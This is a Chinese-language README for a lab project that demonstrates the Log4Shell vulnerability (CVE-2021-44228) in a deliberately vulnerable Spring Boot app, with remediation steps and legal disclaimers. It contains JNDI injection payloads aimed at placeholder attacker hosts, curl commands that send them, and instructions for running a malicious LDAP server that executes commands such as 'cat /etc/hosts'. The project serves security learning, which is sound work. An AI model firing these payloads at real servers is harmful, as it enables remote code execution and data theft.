# Log4j2-BugMaker

## CVE-2021-44228 Log4Shell 漏洞演示项目

这是一个用于学习和研究 Log4j2 远程代码执行漏洞（Log4Shell）的演示项目。

## ⚠️ 安全警告

**此项目仅用于安全研究和教育目的，请勿在生产环境中使用！**

本项目使用了存在严重安全漏洞的 Log4j 2.14.1 版本。

## 📋 环境配置

- **Spring Boot**: 2.6.1
- **Log4j2**: 2.14.1 (易受攻击版本)
- **Java**: 8 (JDK 1.8)

## 🚀 快速开始

### 1. 编译项目

```bash
./mvnw clean package
```

### 2. 运行应用

```bash
./mvnw spring-boot:run
```

或者：

```bash
java -jar target/log4j2-bugmaker-0.0.1-SNAPSHOT.jar
```

### 3. 访问应用

打开浏览器访问：http://localhost:8080

## 🎯 漏洞端点

### 1. User-Agent 头注入

```bash
curl -H "User-Agent: \${jndi:ldap://attacker.com/a}" http://localhost:8080/api/log
```

### 2. 查询参数注入

```bash
curl "http://localhost:8080/api/search?query=\${jndi:ldap://attacker.com/a}"
```

### 3. 健康检查（无漏洞）

```bash
curl http://localhost:8080/api/health
```

## 💡 漏洞原理

Log4Shell (CVE-2021-44228) 是 Apache Log4j2 中的一个严重漏洞。当应用程序记录包含特殊格式字符串的用户输入时，Log4j2 会解析 JNDI 查找表达式，攻击者可以利用此特性执行远程代码。

### 攻击载荷示例

```
${jndi:ldap://evil.com/a}
${jndi:rmi://evil.com/a}
${jndi:dns://evil.com/a}
```

### 测试载荷（安全）

```
${java:version}
${java:os}
${env:PATH}
```

## 🔧 测试步骤

1. 启动应用
2. 发送包含 JNDI 表达式的请求
3. 查看控制台日志，观察 Log4j2 的解析行为

## 🛡️ 修复方案

### 方案 1：升级 Log4j2 版本

将 Log4j2 升级到 2.17.1 或更高版本：

```xml
<properties>
    <log4j2.version>2.17.1</log4j2.version>
</properties>
```

### 方案 2：设置 JVM 参数

```bash
-Dlog4j2.formatMsgNoLookups=true
```

### 方案 3：移除 JndiLookup 类

```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

## 🚀 远程代码执行演示

### 方法 1：使用提供的工具（推荐）

```bash
# 1. 运行自动化脚本
./setup-exploit-server.sh

# 2. 选择 JNDI-Injection-Exploit 工具
# 3. 输入要执行的命令（如 whoami 或 cat /etc/hosts）
# 4. 在另一个终端发送攻击载荷
```

### 方法 2：使用 Python LDAP 服务器

```bash
# 启动恶意 LDAP 服务器
python3 simple-ldap-server.py "whoami"

# 或执行其他命令
python3 simple-ldap-server.py "cat /etc/hosts"

# 在另一个终端发送攻击载荷
curl -H 'User-Agent: ${jndi:ldap://YOUR_IP:1389/Exploit}' http://localhost:8080/api/log
```

### 方法 3：DNS 外带验证（无需搭建服务器）

```bash
# 运行 DNS 外带测试脚本
./test-dns-exfiltration.sh

# 按提示操作，访问 dnslog.cn 获取子域名
# 然后查看是否收到 DNS 查询请求
```

## 📚 参考资料

- [CVE-2021-44228 详情](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j 安全公告](https://logging.apache.org/log4j/2.x/security.html)
- [CISA 警告](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
- [JNDIExploit](https://github.com/feihong-cs/JNDIExploit)

## 📝 许可证

本项目仅用于教育目的，使用者需自行承担使用风险。

## ⚠️ 法律声明

未经授权对他人系统进行渗透测试是违法行为！本项目仅用于：
- 在自己的测试环境中学习
- 经过授权的安全测试
- 安全研究和教育目的

请遵守当地法律法规，负责任地使用这些知识。
